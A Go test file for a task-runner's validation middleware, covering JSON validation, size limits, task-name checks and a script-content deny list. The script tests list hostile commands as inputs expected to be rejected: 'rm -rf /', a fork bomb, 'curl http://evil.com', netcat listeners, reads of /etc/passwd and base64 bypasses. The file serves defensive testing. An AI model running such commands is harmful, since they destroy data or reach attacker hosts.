package middleware

import (
	"bytes"
	"encoding/json"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/gin-gonic/gin"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
	"github.com/voidrunnerhq/voidrunner/internal/models"
)

func TestNewValidationMiddleware(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))

	t.Run("creates validation middleware with custom validators", func(t *testing.T) {
		vm := NewValidationMiddleware(logger)

		assert.NotNil(t, vm)
		assert.NotNil(t, vm.validator)
		assert.NotNil(t, vm.logger)
	})
}

func TestValidationMiddleware_ValidateJSON(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	vm := NewValidationMiddleware(logger)

	// Test struct for validation
	type TestRequest struct {
		Name  string `json:"name" validate:"required,min=1,max=50"`
		Email string `json:"email" validate:"required,email"`
		Age   int    `json:"age" validate:"required,min=1,max=120"`
	}

	t.Run("validates correct JSON successfully", func(t *testing.T) {
		middleware := vm.ValidateJSON(TestRequest{})

		router := gin.New()
		router.Use(middleware)
		router.POST("/test", func(c *gin.Context) {
			validated, exists := c.Get("validated_body")
			assert.True(t, exists)

			req := validated.(*TestRequest)
			assert.Equal(t, "John Doe", req.Name)
			assert.Equal(t, "john@example.com", req.Email)
			assert.Equal(t, 25, req.Age)

			c.JSON(http.StatusOK, gin.H{"message": "valid"})
		})

		validData := TestRequest{
			Name:  "John Doe",
			Email: "john@example.com",
			Age:   25,
		}

		jsonData, _ := json.Marshal(validData)
		req := httptest.NewRequest("POST", "/test", bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusOK, w.Code)
		assert.Contains(t, w.Body.String(), "valid")
	})

	t.Run("rejects invalid JSON format", func(t *testing.T) {
		middleware := vm.ValidateJSON(TestRequest{})

		router := gin.New()
		router.Use(middleware)
		router.POST("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "should not reach here"})
		})

		req := httptest.NewRequest("POST", "/test", strings.NewReader("invalid json"))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusBadRequest, w.Code)
		assert.Contains(t, w.Body.String(), "Invalid request format")
	})

	t.Run("rejects data failing validation", func(t *testing.T) {
		middleware := vm.ValidateJSON(TestRequest{})

		router := gin.New()
		router.Use(middleware)
		router.POST("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "should not reach here"})
		})

		invalidData := TestRequest{
			Name:  "",              // Required field empty
			Email: "invalid-email", // Invalid email format
			Age:   -5,              // Below minimum
		}

		jsonData, _ := json.Marshal(invalidData)
		req := httptest.NewRequest("POST", "/test", bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusBadRequest, w.Code)

		var response map[string]interface{}
		err := json.Unmarshal(w.Body.Bytes(), &response)
		require.NoError(t, err)

		assert.Equal(t, "Validation failed", response["error"])
		assert.Contains(t, response, "validation_errors")

		errors := response["validation_errors"].([]interface{})
		assert.Greater(t, len(errors), 0)
	})

	t.Run("handles missing required fields", func(t *testing.T) {
		middleware := vm.ValidateJSON(TestRequest{})

		router := gin.New()
		router.Use(middleware)
		router.POST("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "should not reach here"})
		})

		// Missing all required fields
		emptyData := map[string]interface{}{}

		jsonData, _ := json.Marshal(emptyData)
		req := httptest.NewRequest("POST", "/test", bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusBadRequest, w.Code)
		assert.Contains(t, w.Body.String(), "Validation failed")
	})
}

func TestValidationMiddleware_ValidateRequestSize(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	vm := NewValidationMiddleware(logger)

	t.Run("allows requests under size limit", func(t *testing.T) {
		middleware := vm.ValidateRequestSize(100) // 100 bytes limit

		router := gin.New()
		router.Use(middleware)
		router.POST("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "success"})
		})

		smallData := strings.Repeat("a", 50) // 50 bytes
		req := httptest.NewRequest("POST", "/test", strings.NewReader(smallData))
		req.Header.Set("Content-Length", "50")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusOK, w.Code)
	})

	t.Run("rejects requests over size limit", func(t *testing.T) {
		middleware := vm.ValidateRequestSize(50) // 50 bytes limit

		router := gin.New()
		router.Use(middleware)
		router.POST("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "should not reach here"})
		})

		largeData := strings.Repeat("a", 100) // 100 bytes
		req := httptest.NewRequest("POST", "/test", strings.NewReader(largeData))
		req.Header.Set("Content-Length", "100")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusRequestEntityTooLarge, w.Code)
		assert.Contains(t, w.Body.String(), "Request body too large")
		assert.Contains(t, w.Body.String(), "50")
	})

	t.Run("handles zero content length", func(t *testing.T) {
		middleware := vm.ValidateRequestSize(100)

		router := gin.New()
		router.Use(middleware)
		router.POST("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "success"})
		})

		req := httptest.NewRequest("POST", "/test", nil)
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusOK, w.Code)
	})
}

func TestValidationMiddleware_TaskValidation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	vm := NewValidationMiddleware(logger)

	t.Run("ValidateTaskCreation works", func(t *testing.T) {
		middleware := vm.ValidateTaskCreation()
		assert.NotNil(t, middleware)

		router := gin.New()
		router.Use(middleware)
		router.POST("/tasks", func(c *gin.Context) {
			c.JSON(http.StatusCreated, gin.H{"message": "task created"})
		})

		timeoutSeconds := 30
		validTask := models.CreateTaskRequest{
			Name:           "Test Task",
			ScriptContent:  "print('hello world')",
			ScriptType:     "python",
			TimeoutSeconds: &timeoutSeconds,
		}

		jsonData, _ := json.Marshal(validTask)
		req := httptest.NewRequest("POST", "/tasks", bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusCreated, w.Code)
	})

	t.Run("ValidateTaskUpdate works", func(t *testing.T) {
		middleware := vm.ValidateTaskUpdate()
		assert.NotNil(t, middleware)

		router := gin.New()
		router.Use(middleware)
		router.PUT("/tasks/123", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "task updated"})
		})

		name := "Updated Task"
		updateTask := models.UpdateTaskRequest{
			Name: &name,
		}

		jsonData, _ := json.Marshal(updateTask)
		req := httptest.NewRequest("PUT", "/tasks/123", bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusOK, w.Code)
	})

	t.Run("ValidateTaskExecutionUpdate works", func(t *testing.T) {
		middleware := vm.ValidateTaskExecutionUpdate()
		assert.NotNil(t, middleware)

		router := gin.New()
		router.Use(middleware)
		router.PUT("/executions/123", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "execution updated"})
		})

		returnCode := 0
		stdout := "Hello World"
		status := models.ExecutionStatusCompleted
		updateExecution := models.UpdateTaskExecutionRequest{
			Status:     &status,
			ReturnCode: &returnCode,
			Stdout:     &stdout,
		}

		jsonData, _ := json.Marshal(updateExecution)
		req := httptest.NewRequest("PUT", "/executions/123", bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusOK, w.Code)
	})
}

func TestValidateScriptContent(t *testing.T) {
	tests := []struct {
		name     string
		content  string
		expected bool
	}{
		// Valid content
		{"simple python", "print('hello world')", true},
		{"basic javascript", "console.log('hello')", true},
		{"math calculation", "result = 2 + 2", true},
		{"loop", "for i in range(10): print(i)", true},

		// Empty/whitespace content
		{"empty string", "", false},
		{"only whitespace", "   \n\t   ", false},

		// Dangerous commands
		{"rm command", "rm -rf /", false},
		{"rmdir command", "rmdir /tmp", false},
		{"format command", "format c:", false},
		{"fork bomb", ":(){ :|:& };:", false},
		{"chmod 777", "chmod 777 file", false},
		{"sudo command", "sudo rm file", false},
		{"passwd command", "passwd user", false},
		{"curl download", "curl http://evil.com", false},
		{"wget download", "wget http://malicious.com", false},
		{"netcat backdoor", "nc -l 4444", false},
		{"ssh command", "ssh user@host", false},
		{"kill process", "kill -9 1234", false},
		{"reboot system", "reboot now", false},
		{"mount filesystem", "mount /dev/sda1", false},
		{"crontab scheduling", "crontab -e", false},

		// Dangerous Python
		{"python import os", "import os", false},
		{"python subprocess", "import subprocess", false},
		{"python exec", "exec('malicious code')", false},
		{"python eval", "eval('2+2')", false},
		{"python open file", "open('/etc/passwd')", false},
		{"python input", "input('Enter:')", false},
		{"python exit", "exit(0)", false},

		// Dangerous file paths
		{"bin path", "ls /bin/bash", false},
		{"etc path", "cat /etc/passwd", false},
		{"tmp path", "touch /tmp/file", false},
		{"proc path", "cat /proc/version", false},
		{"windows c drive", "dir c:\\windows", false},
		{"parent directory", "cd ../../../", false},
		{"current directory", "./malicious.sh", false},
		{"home directory", "ls ~/documents", false},

		// Encoding bypass attempts
		{"base64 encoding", "echo 'ZXZpbA==' | base64 -d", false},
		{"base64 decode", "import base64; base64.b64decode('data')", false},
		{"hex encoding", "echo '\\x41\\x42'", false},
		{"hex prefix", "echo 0x4142", false},

		// Case sensitivity tests
		{"uppercase RM", "RM -RF /", false},
		{"mixed case rm", "Rm -rf /", false},
		{"uppercase SUDO", "SUDO rm file", false},

		// Valid content that might look suspicious
		{"legitimate print", "print('Hello, World!')", true},
		{"math operations", "x = 5 * 3 + 2", true},
		{"string manipulation", "name = 'John'; greeting = 'Hello, ' + name", true},
		{"conditional logic", "if x > 5: print('big')", true},
		{"function definition", "def add(a, b): return a + b", true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test the logic directly by replicating the validation function logic
			content := strings.ToLower(strings.TrimSpace(tt.content))

			result := true
			if content == "" {
				result = false
			} else {
				// Test dangerous patterns (simplified version of the validation logic)
				dangerousPatterns := []string{
					"rm -rf", "rm -r", "rm -f", "rmdir", "del /f", "del /s", "format c:",
					"mkfs", "dd if=", ":(){ :|:& };:", "chmod 777", "chmod +x",
					"/etc/passwd", "/etc/shadow", "sudo", "su -", "passwd", "useradd",
					"userdel", "curl", "wget", "nc -", "netcat", "telnet", "ssh",
					"scp", "rsync", "ping -f", "iptables", "firewall", "kill -9",
					"killall", "pkill", "reboot", "shutdown", "halt", "poweroff",
					"mount", "umount", "fdisk", "crontab", "at ", "batch", "nohup",
					"disown", "exec(", "eval(", "system(", "shell_exec", "passthru",
					"proc_open", "popen", "file_get_contents", "file_put_contents",
					"fopen", "fwrite", "include(", "require(", "import os",
					"import subprocess", "import sys", "__import__", "exec(",
					"eval(", "compile(", "open(", "input(", "raw_input(",
					"execfile(", "reload(", "exit(", "quit(",
				}

				for _, pattern := range dangerousPatterns {
					if strings.Contains(content, pattern) {
						result = false
						break
					}
				}

				if result {
					suspiciousPaths := []string{
						"/bin/", "/sbin/", "/usr/bin/", "/usr/sbin/", "/etc/",
						"/var/", "/tmp/", "/proc/", "/sys/", "/dev/", "/root/",
						"/home/", "c:\\", "c:/", "../", "./", "~/",
					}

					for _, path := range suspiciousPaths {
						if strings.Contains(content, path) {
							result = false
							break
						}
					}
				}

				if result {
					if strings.Contains(content, "base64") || strings.Contains(content, "b64decode") ||
						strings.Contains(content, "\\x") || strings.Contains(content, "0x") {
						result = false
					}
				}
			}

			assert.Equal(t, tt.expected, result, "Content: %s", tt.content)
		})
	}
}

func TestValidateScriptType(t *testing.T) {
	tests := []struct {
		name       string
		scriptType string
		expected   bool
	}{
		{"valid python", "python", true},
		{"valid javascript", "javascript", true},
		{"valid bash", "bash", true},
		{"valid go", "go", true},
		{"invalid java", "java", false},
		{"invalid c++", "cpp", false},
		{"invalid ruby", "ruby", false},
		{"empty string", "", false},
		{"uppercase Python", "Python", false}, // Case sensitive
		{"mixed case", "JavaScript", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test the logic directly since we can't easily mock FieldLevel
			scriptType := tt.scriptType
			validTypes := []string{"python", "javascript", "bash", "go"}

			result := false
			for _, validType := range validTypes {
				if scriptType == validType {
					result = true
					break
				}
			}

			assert.Equal(t, tt.expected, result)
		})
	}
}

func TestValidateTaskName(t *testing.T) {
	tests := []struct {
		name     string
		taskName string
		expected bool
	}{
		// Valid names
		{"simple name", "My Task", true},
		{"with numbers", "Task 123", true},
		{"with underscores", "task_name_here", true},
		{"with hyphens", "task-name-here", true},
		{"with spaces", "My Great Task", true},
		{"single character", "a", true},
		{"alphanumeric", "Task123ABC", true},

		// Invalid names
		{"empty string", "", false},
		{"only whitespace", "   ", false},
		{"too long", strings.Repeat("a", 256), false}, // Over 255 chars

		// Invalid characters
		{"less than", "task<name", false},
		{"greater than", "task>name", false},
		{"double quote", "task\"name", false},
		{"single quote", "task'name", false},
		{"ampersand", "task&name", false},
		{"semicolon", "task;name", false},
		{"pipe", "task|name", false},
		{"backtick", "task`name", false},
		{"dollar sign", "task$name", false},
		{"parentheses", "task(name)", false},
		{"braces", "task{name}", false},
		{"brackets", "task[name]", false},
		{"backslash", "task\\name", false},
		{"forward slash", "task/name", false},
		{"colon", "task:name", false},
		{"asterisk", "task*name", false},
		{"question mark", "task?name", false},
		{"newline", "task\nname", false},
		{"carriage return", "task\rname", false},
		{"tab", "task\tname", false},

		// Edge cases
		{"exactly 255 chars", strings.Repeat("a", 255), true},
		{"254 chars", strings.Repeat("a", 254), true},
		{"leading/trailing spaces", "  task name  ", true}, // Should be trimmed
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Test the logic directly
			name := strings.TrimSpace(tt.taskName)

			result := true
			if name == "" || len(name) > 255 {
				result = false
			} else {
				invalidChars := []string{
					"<", ">", "\"", "'", "&", ";", "|", "`", "$", "(", ")", "{", "}", "[", "]",
					"\\", "/", ":", "*", "?", "\n", "\r", "\t",
				}

				for _, char := range invalidChars {
					if strings.Contains(name, char) {
						result = false
						break
					}
				}
			}

			assert.Equal(t, tt.expected, result, "Task name: %q", tt.taskName)
		})
	}
}

func TestTaskValidation(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))

	t.Run("returns validation middleware", func(t *testing.T) {
		vm := TaskValidation(logger)
		assert.NotNil(t, vm)
		assert.NotNil(t, vm.validator)
		assert.NotNil(t, vm.logger)
	})
}

func TestRequestSizeLimit(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))

	t.Run("returns middleware with 1MB limit", func(t *testing.T) {
		middleware := RequestSizeLimit(logger)
		assert.NotNil(t, middleware)

		// Test that it works as a middleware
		router := gin.New()
		router.Use(middleware)
		router.POST("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "success"})
		})

		// Small request should pass
		req := httptest.NewRequest("POST", "/test", strings.NewReader("small"))
		req.Header.Set("Content-Length", "5")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)
		assert.Equal(t, http.StatusOK, w.Code)
	})
}

func TestValidationMiddleware_FormatValidationErrors(t *testing.T) {
	logger := slog.New(slog.NewTextHandler(os.Stdout, &slog.HandlerOptions{Level: slog.LevelError}))
	vm := NewValidationMiddleware(logger)

	// Test struct with validation tags
	type TestStruct struct {
		Name  string `json:"name" validate:"required,min=2,max=50"`
		Email string `json:"email" validate:"required,email"`
		Age   int    `json:"age" validate:"required,min=1,max=120"`
	}

	t.Run("formats validation errors correctly", func(t *testing.T) {
		middleware := vm.ValidateJSON(TestStruct{})

		router := gin.New()
		router.Use(middleware)
		router.POST("/test", func(c *gin.Context) {
			c.JSON(http.StatusOK, gin.H{"message": "should not reach here"})
		})

		// Send invalid data
		invalidData := TestStruct{
			Name:  "x",             // Too short (min=2)
			Email: "invalid-email", // Invalid email format
			Age:   150,             // Too high (max=120)
		}

		jsonData, _ := json.Marshal(invalidData)
		req := httptest.NewRequest("POST", "/test", bytes.NewBuffer(jsonData))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()

		router.ServeHTTP(w, req)

		assert.Equal(t, http.StatusBadRequest, w.Code)

		var response map[string]interface{}
		err := json.Unmarshal(w.Body.Bytes(), &response)
		require.NoError(t, err)

		assert.Equal(t, "Validation failed", response["error"])

		errors := response["validation_errors"].([]interface{})
		assert.Greater(t, len(errors), 0)

		// Check that each error has the expected fields
		for _, errItem := range errors {
			errMap := errItem.(map[string]interface{})
			assert.Contains(t, errMap, "field")
			assert.Contains(t, errMap, "value")
			assert.Contains(t, errMap, "tag")
			assert.Contains(t, errMap, "message")
		}
	})
}

func TestValidationMiddleware_GetValidationMessage(t *testing.T) {
	tests := []struct {
		tag      string
		field    string
		param    string
		expected string
	}{
		{"required", "Name", "", "Name is required"},
		{"min", "Password", "8", "Password must be at least 8 characters"},
		{"max", "Bio", "500", "Bio must be at most 500 characters"},
		{"email", "Email", "", "Email must be a valid email address"},
		{"oneof", "Status", "active inactive", "Status must be one of: active inactive"},
		{"script_content", "Code", "", "Script content contains potentially dangerous patterns"},
		{"script_type", "Type", "", "Invalid script type. Supported types: python, javascript, bash, go"},
		{"task_name", "Name", "", "Task name contains invalid characters or is too long"},
		{"unknown", "Field", "", "Field failed validation: unknown"},
	}

	for _, tt := range tests {
		t.Run(tt.tag, func(t *testing.T) {
			// We can't easily test the actual method without implementing the full validator.FieldError interface
			// So we test the logic based on the switch statement
			var message string
			switch tt.tag {
			case "required":
				message = tt.field + " is required"
			case "min":
				message = tt.field + " must be at least " + tt.param + " characters"
			case "max":
				message = tt.field + " must be at most " + tt.param + " characters"
			case "email":
				message = tt.field + " must be a valid email address"
			case "oneof":
				message = tt.field + " must be one of: " + tt.param
			case "script_content":
				message = "Script content contains potentially dangerous patterns"
			case "script_type":
				message = "Invalid script type. Supported types: python, javascript, bash, go"
			case "task_name":
				message = "Task name contains invalid characters or is too long"
			default:
				message = tt.field + " failed validation: " + tt.tag
			}

			assert.Equal(t, tt.expected, message)
		})
	}
}
